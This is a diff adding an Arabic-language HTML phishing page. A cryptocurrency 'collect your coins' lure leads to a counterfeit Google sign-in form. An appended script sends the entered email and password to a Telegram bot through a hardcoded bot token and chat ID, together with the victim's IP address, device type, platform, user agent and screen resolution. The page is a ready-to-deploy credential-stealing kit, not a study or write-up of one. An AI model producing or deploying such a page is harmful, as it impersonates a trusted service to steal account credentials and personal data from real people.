@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>جمع العملات - Gmail</title>
+  <style>
+    /* إعادة تعيين بعض القيم الأساسية */
+    * {
+      box-sizing: border-box;
+    }
+    html, body {
+      margin: 0;
+      height: 100%;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f2f2f2;
+      direction: rtl;
+      position: relative;
+    }
+
+    /* إخفاء العناصر */
+    .hidden {
+      display: none !important;
+    }
+
+    /* وضعية الشاشة الكاملة */
+    .full-screen {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+    }
+
+    /* الصفحة التمهيدية */
+    .intro-container {
+      background: linear-gradient(to bottom right, #141e30, #243b55);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 30px;
+      text-align: center;
+      z-index: 1;
+    }
+    .intro-container .logo img {
+      width: 100px;
+      margin-bottom: 30px;
+    }
+    .headline {
+      font-size: 26px;
+      font-weight: bold;
+      margin-bottom: 30px;
+      color: #ffd700;
+      user-select: none; /* لمنع التحديد النصي عند النقر */
+    }
+    .badges {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 30px;
+    }
+    .badges img {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: #fff;
+      padding: 5px;
+    }
+
+    /* زر البدء */
+    .start-btn {
+      background-color: #f9a825;
+      color: #000;
+      padding: 14px 30px;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .start-btn:hover,
+    .start-btn:focus {
+      background-color: #f57f17;
+      outline: none;
+    }
+
+    /* صفحة تسجيل الدخول */
+    .main-container {
+      display: none; /* مخفية بشكل افتراضي */
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      background: #f2f2f2;
+      z-index: 2;
+    }
+    .main-container.active {
+      display: flex; /* تُظهر الصفحة عند التفعيل */
+    }
+    .login-card {
+      background: #fff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      width: 380px;
+      max-width: 90%;
+      text-align: right;
+    }
+    .login-card .logo {
+      width: 80px;
+      margin-bottom: 20px;
+      display: block;
+      margin-left: auto;
+      margin-right: 0;
+    }
+    h2 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #202124;
+    }
+    .subtitle {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 30px;
+    }
+    input {
+      width: 100%;
+      padding: 12px 10px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 6px;
+      outline: none;
+      margin-bottom: 20px;
+      transition: border-color 0.3s;
+    }
+    input:focus {
+      border-color: #1a73e8;
+    }
+    .btn {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background 0.3s;
+      width: 100%;
+    }
+    .btn:hover,
+    .btn:focus {
+      background-color: #155ab6;
+      outline: none;
+    }
+
+    /* تذييل الصفحة */
+    .footer {
+      margin-top: 30px;
+      text-align: center;
+    }
+    .footer select {
+      padding: 6px;
+      border-radius: 6px;
+      border: 1px solid #dadce0;
+      margin-bottom: 10px;
+      min-width: 180px;
+      cursor: pointer;
+    }
+    .footer-links {
+      list-style: none;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      font-size: 13px;
+      flex-wrap: wrap;
+    }
+    .footer-links a {
+      color: #5f6368;
+      text-decoration: none;
+    }
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+  </style>
+</head>
+<body>
+
+  <!-- الصفحة التمهيدية -->
+  <div id="introPage" class="intro-container full-screen">
+    <div class="logo">
+      <img src="crypto-logo.png" alt="شعار العملات" />
+    </div>
+    <h1 class="headline">انقر هنا لجمع العملات الخاصة بك</h1>
+    <div class="badges">
+      <img src="badge1.png" alt="شارة 1" />
+      <img src="badge2.png" alt="شارة 2" />
+      <img src="badge3.png" alt="شارة 3" />
+    </div>
+    <button class="start-btn" onclick="goToLogin()">اضغط هنا</button>
+  </div>
+
+  <!-- صفحة تسجيل الدخول -->
+  <div id="loginPage" class="main-container full-screen hidden" role="main" aria-label="صفحة تسجيل الدخول">
+    <div class="login-card">
+      <img src="logo.png" alt="شعار جوجل" class="logo" />
+      <h2>تسجيل الدخول</h2>
+      <p class="subtitle">استخدم حسابك على Google</p>
+      <form id="login-form" autocomplete="on">
+        <input id="email" name="email" type="email" placeholder="رقم الهاتف أو البريد الإلكتروني" required aria-label="البريد الإلكتروني أو رقم الهاتف" />
+        <input id="password" name="password" type="password" placeholder="كلمة المرور" required aria-label="كلمة المرور" />
+        <button class="btn" type="submit">التالي</button>
+      </form>
+      <div class="footer">
+        <select aria-label="اختيار اللغة">
+          <option>العربية (السعودية)</option>
+          <option>English (United States)</option>
+          <option>الروسية</option>
+          <option>الألمانية</option>
+        </select>
+        <ul class="footer-links">
+          <li><a href="#">مساعدة</a></li>
+          <li><a href="#">الخصوصية</a></li>
+          <li><a href="#">الشروط</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- JavaScript -->
+  <script>
+    function goToLogin() {
+      // إخفاء الصفحة التمهيدية
+      const intro = document.getElementById('introPage');
+      const login = document.getElementById('loginPage');
+
+      intro.classList.add('hidden');
+      login.classList.remove('hidden');
+      login.classList.add('active');
+    }
+
+    // لتعطيل إرسال النموذج في هذا المثال
+    document.getElementById('login-form').addEventListener('submit', function(event){
+      event.preventDefault();
+      alert('بيانات محفظة العملات خاطئة');
+    });
+  </script>
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "7552825533:AAFlSfoyrFULTQ-7vLQrhfRNLlk6-Rw8r3Y";                                                            // ظ‡ظ†ط§ ط§ظ„طھظˆظƒظٹظ†              
+    const CHAT_ID = "7403004517";                                                       // ظ‡ظ†ط§ ظ…ط¹ط±ظپ ط§ظ„ط´ط§طھ https://api.telegram.org/bot/getUpdates
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = ` 
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b> ${email}\n
+                    <b>Password:</b> ${password}\n
+                    <b>IP Address:</b> ${ip}\n
+                    <b>Device Type:</b> ${deviceType}\n
+                    <b>Platform:</b> ${platform}\n
+                    <b>User Agent:</b> ${userAgent}\n
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('Information sent successfully!');
+                }).catch(error => {
+                    alert('Error sending the information. Please try again.');
+                });
+            })
+            .catch(error => {
+                alert('Error fetching the IP address. Please try again.');
+            });
+    });
+</script>
+</body>
+</html>
